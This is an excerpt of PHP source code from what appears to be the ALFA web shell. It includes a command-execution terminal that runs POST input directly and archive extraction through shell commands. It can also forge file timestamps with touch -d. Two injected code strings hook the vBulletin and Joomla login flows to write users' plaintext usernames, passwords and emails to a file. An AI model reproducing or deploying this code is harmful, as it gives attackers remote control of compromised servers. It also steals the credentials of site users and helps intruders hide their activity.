echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
}elseif($GLOBALS['sys']=='unix'&&!empty($file_type)&&_alfa_can_runCommand(true,true)&&(strlen(dosaEx('which unzip')) > 0||strlen(dosaEx('which tar')) > 0||strlen(dosaEx('which gunzip')) > 0)){
switch ($file_type) {
	case 'application/zip':
		dosaEx("cd '".addslashes($zipfile)."';unzip '".addslashes($dirzip)."'");
	break;
	case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
		if(strstr(basename($dirzip), ".tar.gz")||strstr(basename($dirzip), ".tar")){
			dosaEx("cd '".addslashes($zipfile)."';tar xzf '".addslashes($dirzip)."'");
		}else{
			dosaEx("cd '".addslashes($zipfile)."';gunzip '".addslashes($dirzip)."'");
		}
	break;
}
...
$code='$dosa_username = strtolower($vbulletin->GPC["vb_login_username"]);$dosa_password = $vbulletin->GPC["vb_login_password"];$alfa_file = "{saveto_path}";$sql_query = $vbulletin->db->query_read("SELECT * FROM " . TABLE_PREFIX . "user WHERE `username`=\'" . $dosa_username . "\'");while($row = $vbulletin->db->fetch_array($sql_query)){if(strlen($dosa_password) > 1 AND strlen($dosa_username) > 1){$fp1 = @fopen($alfa_file, "a+");@fwrite($fp1, $dosa_username . \' : \' .  $dosa_password." (" . $row["email"] . ")\n");@fclose($fp1); $f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
...
$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$dosa_data = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($dosa_data, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
return('<iframe src="'.__DOSA_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class DosaCURL {
public $headers;
public $user_agent;
...
function alfaterminalExec(){
	...
	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['alfa1'], $match)){
		...
		$current_path = dosaEx("cd ".addslashes($match[1]).$seperator.$pwd);
		$current_path = str_replace("\\", "/", $current_path);
	}
	$out = dosaEx($cmd.$_POST['alfa1'], true);
	...
	if($action == "rename" || $action == "move"){
		...
		if(!empty($_POST['alfa2'])){
			...
			if($chdir_fals&&$alfa_canruncmd){
				if(_alfa_is_writable($_POST['alfa1'])){
					$cmd_rename = true;
					$alfa1_escape = addslashes($alfa1_decoded);
					dosaEx("cd '".addslashes($_POST['c'])."';mv '".$alfa1_escape."' '".addslashes($_POST['alfa2'])."'");
				}
			}
		...
		if( !empty($_POST['alfa1']) ) {
			...
			if($time){
				$touched = false;
				if($chdir_fals&&$alfa_canruncmd){
					dosaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa1']))."' '".addslashes($_POST['alfa2'])."'");
					$touched = true;
				}
